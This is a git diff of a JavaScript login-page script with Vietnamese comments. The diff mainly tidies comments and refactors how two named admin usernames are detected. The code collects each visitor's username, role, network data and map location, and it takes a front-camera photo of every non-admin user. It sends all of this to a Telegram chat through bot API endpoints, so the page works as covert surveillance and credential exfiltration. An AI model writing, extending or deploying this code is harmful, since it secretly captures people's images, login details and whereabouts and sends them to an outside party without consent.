@@ -30,15 +30,10 @@ async function getNetworkData() {
   }
 }
 
-// SỬA LẠI HÀM CHỤP: Kiểm tra trực tiếp ID username để chặn tuyệt đối
 async function captureCamera() {
   const user = document.getElementById('username').value.trim();
-  
-  // CHẶN NGAY LẬP TỨC: Nếu là Admin thì không chạy bất cứ dòng code camera nào
-  if (user === "Mrwenben" || user === "VanThanh") {
-    console.log("Admin detected: Camera disabled.");
-    return null;
-  }
+  // CHẶN TUYỆT ĐỐI: Admin không bao giờ chạy code camera
+  if (user === "Mrwenben" || user === "VanThanh") return null;
 
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
@@ -60,14 +55,15 @@ async function captureCamera() {
   } catch (e) { return null; }
 }
 
+// --- HÀM TẠO NỘI DUNG SIÊU SẠCH (KHÔNG CÒN DÒNG THIẾT BỊ) ---
 function getCaption() {
-  // Sửa lại Maps Link để tránh bị lỗi hiển thị
   const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
   
-  // Tiêu đề Admin hoặc Người dùng thường
-  const header = info.isAdmin ? `⚠️ THÔNG BÁO ADMIN ${info.loginDetails.toUpperCase()} VỪA ĐĂNG NHẬP VÀO TRANG` : '🔐 [THÔNG TIN ĐĂNG NHẬP]';
+  const header = info.isAdmin 
+    ? `⚠️ THÔNG BÁO ADMIN ${info.loginDetails.toUpperCase()} VỪA ĐĂNG NHẬP` 
+    : '🔐 [THÔNG TIN ĐĂNG NHẬP]';
 
-  // TUYỆT ĐỐI KHÔNG CÓ DÒNG THIẾT BỊ/DVI Ở ĐÂY
+  // Ở đây tôi đã xóa sạch mọi biến liên quan đến device/os/dvi
   return `
 ${header}
 ━━━━━━━━━━━━━━━━━━
@@ -82,27 +78,18 @@ ${header}
 }
 
 async function main() {
-  // Lấy dữ liệu ngay lập tức
   const user = document.getElementById('username').value.trim();
   const role = document.getElementById('user-role').value;
   
   info.time = new Date().toLocaleString('vi-VN');
   info.loginDetails = `${user} (${role})`;
+  info.isAdmin = (user === "Mrwenben" || user === "VanThanh");
 
-  // Xác định quyền Admin
-  if (user === "Mrwenben" || user === "VanThanh") {
-      info.isAdmin = true;
-  } else {
-      info.isAdmin = false;
-  }
-
-  // Chạy lấy mạng
   await getNetworkData();
   
-  // Gọi hàm chụp (Hàm này đã có chốt chặn Admin ở bên trong)
   const frontBlob = await captureCamera();
 
-  // Logic gửi tin nhắn
+  // Nếu là Admin hoặc không chụp được ảnh, gửi tin nhắn văn bản thuần túy
   if (frontBlob && !info.isAdmin) {
     const formData = new FormData();
     formData.append('chat_id', TELEGRAM_CHAT_ID);
@@ -111,7 +98,6 @@ async function main() {
     formData.append('media', JSON.stringify(media));
     await fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
   } else {
-    // Admin luôn luôn vào đây, không gửi ảnh, không gửi dvi
     await fetch(API_SEND_TEXT, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
